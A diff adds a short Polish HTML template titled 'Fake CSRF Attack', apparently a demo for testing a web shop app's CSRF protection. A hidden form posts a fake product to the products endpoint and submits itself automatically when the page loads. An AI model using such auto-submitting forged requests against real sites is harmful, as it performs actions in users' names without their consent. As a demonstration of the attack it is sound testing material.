@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fake CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Attack</h1>
+    <p>Kliknij aby ddoac produkty bez wpisywania :) !</p>
+    <form id="csrfForm" action="{{ url_for('produkty.produkty') }}" method="POST">
+        <!-- Wstawienie danych produktu -->
+        <input type="hidden" name="nazwa" value="Fake Produkt">
+        <input type="hidden" name="cena" value="99.99">
+        
+        <!-- Wstawienie tokenu CSRF (to jest token wygenerowany przez Twoją aplikację) -->
+        <input type="hidden" name="csrf_token" value="tu-wstaw-porzadny-token-csrf">
+        
+        <!-- Przycisk wysyłający formularz -->
+        <button type="submit">Dodaj produkt</button>
+    </form>
+
+    <script>
+        // Formularz może zostać wysłany automatycznie po załadowaniu strony
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
